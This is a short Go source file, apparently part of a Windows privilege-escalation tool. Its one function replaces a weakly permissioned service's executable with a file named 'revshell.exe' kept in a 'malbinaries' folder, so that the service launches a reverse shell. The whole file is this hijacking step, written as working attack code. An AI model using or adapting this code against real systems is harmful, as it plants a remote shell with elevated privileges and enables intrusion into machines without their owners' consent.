package enumwin

import (
	"fmt"
	"os"
)

func ChangeBinPath(serv *WeakServ) {

	homeDir, _ := os.UserHomeDir()

	malPath := fmt.Sprintf(homeDir + "\\win-binary-hijacking\\internal\\malbinaries\\revshell.exe")

	err := os.Rename(malPath, homeDir+"\\"+serv.BinPath)

	if err != nil {
		fmt.Println("Can't do that")
	}

}
